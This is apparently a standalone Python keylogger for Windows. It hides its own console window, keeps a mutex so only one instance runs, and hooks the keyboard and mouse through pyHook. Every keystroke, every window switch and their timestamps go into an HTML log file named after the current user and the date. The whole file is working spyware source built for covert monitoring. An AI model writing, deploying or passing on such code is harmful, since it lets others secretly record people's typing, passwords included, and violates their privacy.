#!/usr/scripts/python
# -*- coding: utf-8 -*-


import datetime
import os
import sys
# import traceback

import win32gui, win32console
import pyHook
import pythoncom
import win32event, win32api,winerror

mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboy')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print("no")
    sys.exit(0)

def hide():
    """
    Uses windows GUI commands to grab the console and hide it so it runs in the background.
    :return:
    """
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def OnKeyboardEvent(event):
    """
    When keyboard hits happen, notes the key or control character, and writes to the log file.
    If there is an alt-tab event, will note the window change. Need to add period support, to do a return. Readability.
    :param event:
    :return:
    """
    if event.Ascii == 13:
        keys = "<br>\n"  # enter  # "<br>
    elif event.Ascii == 8:
        keys = "|BKS|"
    elif event.Ascii == 127:
        keys = "|DEL|"
    elif event.Ascii == 9:
        keys = "|TAB|"
        global lastwindow
        if lastwindow != event.WindowName and event.WindowName:  # so we can track windows between alt tabs
            lastwindow = event.WindowName
            keys += "\n<br>{1}: Switched to: {0}<br>\n".format(
                event.WindowName,datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    elif chr(event.Ascii) == ".":
        keys = ".<br>\n"
    else:
        keys = chr(event.Ascii)  # event.Key
    with open(log_file,"a") as f:
        f.write(keys)

def OnMouseEvent(event):
    """
    On mouse clicks, notes if the last window was the same as the current window name, and if it isn't,
    logs it to the log file.
    This will also catch change of tab names. But only when clicking, not when alt tabbing.
    :param event:
    :return:
    """
    try:
        global lastwindow
        if lastwindow != event.WindowName and event.WindowName:
            lastwindow = event.WindowName
            with open(log_file,"a") as f:
                f.write("\n<br>{1}: Switched to: {0}<br>\n".format(
                    event.WindowName,datetime.datetime.now().strftime("%Y-%m-%d %H%M%S")))
    except:
        pass

if __name__ == "__main__":
    hide()  # hides UI immediately
    today = datetime.date.today()  # sets today's date for naming
    tracked_user_name = os.environ.get("USERNAME")  # has to have a username
    log_file = "{}_{}.html".format(tracked_user_name, today)  # creates file text name
    with open(log_file,'a') as f:  # not strictly necessary...
        f.write("<html><head><meta charset='UTF-8'></head>\n")
    lastwindow = ''

    obj = pyHook.HookManager()
    obj.KeyDown = OnKeyboardEvent
    obj.MouseAll = OnMouseEvent
    obj.HookKeyboard()
    obj.HookMouse()

    pythoncom.PumpMessages()

